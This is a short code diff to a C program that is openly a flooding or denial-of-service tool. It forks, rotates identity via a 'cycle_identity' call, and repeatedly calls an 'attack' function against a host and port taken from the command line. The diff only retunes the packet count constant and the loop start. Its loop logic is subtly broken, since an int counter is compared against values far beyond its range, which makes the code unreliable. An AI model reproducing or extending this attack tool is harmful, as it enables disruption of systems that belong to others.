@@ -12,7 +12,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 int buffer = 1024;
-#define PPS 109951162777600
+#define PPS 1374389534720
 pid_t pid;
 int i;
 int make_socket(char *host, char *port) {
@@ -94,7 +94,7 @@ int main(int argc, char **argv) {
 		cycle_identity();
 	fork();
         pid = getpid();
-	for(i=1; i <= PPS; i++) {
+	for(i=10000; i <= PPS; i++) {
 			attack(argv[1], argv[2], x);
 		usleep(200000);
 		
